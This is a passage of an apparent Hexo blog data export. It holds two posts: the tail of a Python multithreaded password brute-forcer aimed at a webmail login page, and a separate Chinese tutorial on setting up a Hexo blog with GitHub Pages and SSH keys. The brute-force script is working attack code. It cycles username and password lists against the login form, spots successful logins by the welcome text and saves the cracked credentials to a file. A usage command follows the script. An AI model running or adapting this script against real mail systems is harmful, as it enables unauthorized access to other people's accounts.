BruteParser()</div><div class=\"line\">        parser.feed(response.text)</div><div class=\"line\">        post_tags = parser.tag_results</div><div class=\"line\">        post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47)       # 登录按钮图片 47x39像素</div><div class=\"line\">        post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39)</div><div class=\"line\"></div><div class=\"line\">        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。</div><div class=\"line\">        while not self.user_q.empty():</div><div class=\"line\">            username = self.user_q.get().rstrip().decode(&quot;ascii&quot;)</div><div class=\"line\">            for password in self.pwdlist:</div><div class=\"line\">                password=password.decode(&quot;ascii&quot;)</div><div class=\"line\">                post_tags[&quot;txtUsername&quot;]=username</div><div class=\"line\">                post_tags[&quot;txtPassword&quot;]=password</div><div class=\"line\">                </div><div class=\"line\">                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。</div><div class=\"line\">                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。</div><div class=\"line\">                print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)       # 退两格，清空一格。 实现清空。</div><div class=\"line\">                print(&quot;\\rTrying: %15s : %15s  (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;)</div><div class=\"line\">                #time.sleep(2)          # 调试时使用的</div><div class=\"line\">                threadLock.release()    # 释放线程锁</div><div class=\"line\">                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)</div><div class=\"line\"></div><div class=\"line\">                if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text):   # 爆破成功</div><div class=\"line\">                    threadLock.acquire()    # 取得线程锁</div><div class=\"line\">                    print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)</div><div class=\"line\">                    print (&quot;\\r[*] --&gt;  %15s\\t%15s&quot; % (username,password))   # 打印到窗口</div><div class=\"line\">                    #time.sleep(2)</div><div class=\"line\">                    threadLock.release()    # 释放线程锁</div><div class=\"line\">                    if self.outfilePath is not None:    # 输出到文件</div><div class=\"line\">                        # 获取文件锁</div><div class=\"line\">                        writeFileLock.acquire()</div><div class=\"line\">                        try:</div><div class=\"line\">                            # 追加到文件</div><div class=\"line\">                            saveFile((username,password),self.outfilePath)</div><div class=\"line\">                        finally:</div><div class=\"line\">                            # 释放锁</div><div class=\"line\">                            writeFileLock.release()</div><div class=\"line\">                    break   # 跳出当前循环，进行下一个用户名爆破</div><div class=\"line\">                if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！</div><div class=\"line\">                    raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;)</div><div class=\"line\">                    exit    # 退出！ 理论上不会执行这一句。</div><div class=\"line\">                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。</div><div class=\"line\"></div><div class=\"line\">                if  (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text):</div><div class=\"line\">                    pass        # 占一个坑，没鸟用</div><div class=\"line\">                pass</div><div class=\"line\"></div><div class=\"line\">                #time.sleep(2)</div><div class=\"line\"># 读取文件，生成队列</div><div class=\"line\">def build_list(listFile):   </div><div class=\"line\">    # read in the list file</div><div class=\"line\">    fd = open(listFile, &quot;rb&quot;)</div><div class=\"line\">    raw_words = fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    words = queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    for word in raw_words:</div><div class=\"line\">        word = word.rstrip()</div><div class=\"line\">        words.put(word)</div><div class=\"line\">    return words</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\">    headCharPic=&quot;\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /&apos;\\_   _/`\\  ------------------\\n    \\___)=(___/\\n&quot;</div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    # 创建一个argparser解析器</div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        prog=&quot;BingoBF&quot;,</div><div class=\"line\">        usage=&quot; %(prog)s [options] &quot;,</div><div class=\"line\">        description=&apos;Brute Force 【https://mail.xxx.com] email\\&apos;s passwords.&apos;,</div><div class=\"line\">        epilog=&quot;+---+\\n&quot;</div><div class=\"line\">        )</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;)</div><div class=\"line\">    groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;)</div><div class=\"line\"></div><div class=\"line\">    groupPwd = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;)</div><div class=\"line\">    groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()    # 命令行参数解析</div><div class=\"line\">    </div><div class=\"line\">    if args.username is not None:</div><div class=\"line\">        userList=list(args.username)</div><div class=\"line\">    else:</div><div class=\"line\">        userList = build_list(args.userList)</div><div class=\"line\">    if args.password is not None:</div><div class=\"line\">        pwdList=list(args.password)</div><div class=\"line\">    else:</div><div class=\"line\">        pwdList = build_list(args.pwdList)</div><div class=\"line\"></div><div class=\"line\">    outfilePath = None</div><div class=\"line\">    if args.output is not None:</div><div class=\"line\">        outfilePath = args.output</div><div class=\"line\">        filePath,fileName=os.path.split(outfilePath)</div><div class=\"line\">        if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   # 若不存在这个目录则递归创建</div><div class=\"line\"></div><div class=\"line\">    if args.thread is not None:</div><div class=\"line\">        user_thread=args.thread</div><div class=\"line\"></div><div class=\"line\">    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)</div><div class=\"line\">    bruter_obj.run_bruteforce()</div><div class=\"line\"></div><div class=\"line\">if __name__ == &apos;__main__&apos;:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"调用sample\"><a href=\"#调用sample\" class=\"headerlink\" title=\"调用sample\"></a>调用sample</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt</div></pre></td></tr></table></figure>\n<h2 id=\"附赠\"><a href=\"#附赠\" class=\"headerlink\" title=\"附赠\"></a>附赠</h2><p>命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。</p>"},{"title":"The begin of blog","_content":"浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n>     记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n>     【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n>     2017年06月09日 记\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n\n<!-- more -->\n\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n\n[图片辅助工具hexo-asset-image](https://github.com/CodeFalling/hexo-asset-image)\n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save \n```\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: The begin of blog\n---\n浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n>     记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n>     【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n>     2017年06月09日 记\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n\n<!-- more -->\n\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n\n[图片辅助工具hexo-asset-image](https://github.com/CodeFalling/hexo-asset-image)\n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save \n```\n\n","slug":"hello-world","published":1,"date":"2017-04-06T12:39:17.000Z","updated":"2017-07-03T10:11:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hst000evquvykq3yfjs","content":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<blockquote>\n<pre><code>记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n2017年06月09日 记\n</code></pre></blockquote>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\" target=\"_blank\" rel=\"external\">https://hexo.io/zh-cn/docs</a></p>\n<a id=\"more\"></a>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" title=\"新建用于存放pages的repo\"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>\n<h3 id=\"新建SSH-Keys\"><a href=\"#新建SSH-Keys\" class=\"headerlink\" title=\"新建SSH Keys\"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\" target=\"_blank\" rel=\"external\">官方文档</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ls -al ~/.ssh     <span class=\"comment\"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class=\"line\"><span class=\"comment\"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class=\"line\">$ ssh-keygen -t rsa -b 4096 -C <span class=\"string\">\"user@oddboy.cn\"</span></div><div class=\"line\">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class=\"comment\"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>\n<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>\n<p>如此, hexo depoly就可以用了。</p>\n<h3 id=\"新建用于存放hexo博客源码的repo\"><a href=\"#新建用于存放hexo博客源码的repo\" class=\"headerlink\" title=\"新建用于存放hexo博客源码的repo\"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git init    <span class=\"comment\"># git本地目录初始化</span></div><div class=\"line\">$ git remote add origin git@github.com:odboy/hexoB<span class=\"built_in\">log</span>-src.git   <span class=\"comment\"># 配置远程git库</span></div><div class=\"line\">$ git add .   </div><div class=\"line\">$ git commit -m <span class=\"string\">\"comment信息\"</span></div><div class=\"line\">$ git status      <span class=\"comment\"># 查看分支情况</span></div><div class=\"line\">$ git push -u origin master   <span class=\"comment\"># 推送到master分支</span></div></pre></td></tr></table></figure>\n<h2 id=\"修改主题-–-spfk\"><a href=\"#修改主题-–-spfk\" class=\"headerlink\" title=\"修改主题 – spfk\"></a>修改主题 – <a href=\"http://luuman.github.io/2015/12/27/Hexo/HexoTheme/\" target=\"_blank\" rel=\"external\">spfk</a></h2><h3 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ cd ~/Documents/hexoBlog</div><div class=\"line\">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class=\"line\">$ cd themes/spfk</div><div class=\"line\">$ git pull      # 主题update</div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------------</div><div class=\"line\">      # Extensions</div><div class=\"line\">      ## Plugins: https://hexo.io/plugins/</div><div class=\"line\">      ## Themes: https://hexo.io/themes/</div><div class=\"line\">      theme: spfk</div><div class=\"line\">--------------------</div></pre></td></tr></table></figure>\n<h3 id=\"插件配置\"><a href=\"#插件配置\" class=\"headerlink\" title=\"插件配置\"></a>插件配置</h3><p><a href=\"https://github.com/CodeFalling/hexo-asset-image\" target=\"_blank\" rel=\"external\">图片辅助工具hexo-asset-image</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install https://github.com/CodeFalling/hexo-asset-image --save</div></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<blockquote>\n<pre><code>记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n2017年06月09日 记\n</code></pre></blockquote>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\">https://hexo.io/zh-cn/docs</a></p>","more":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" 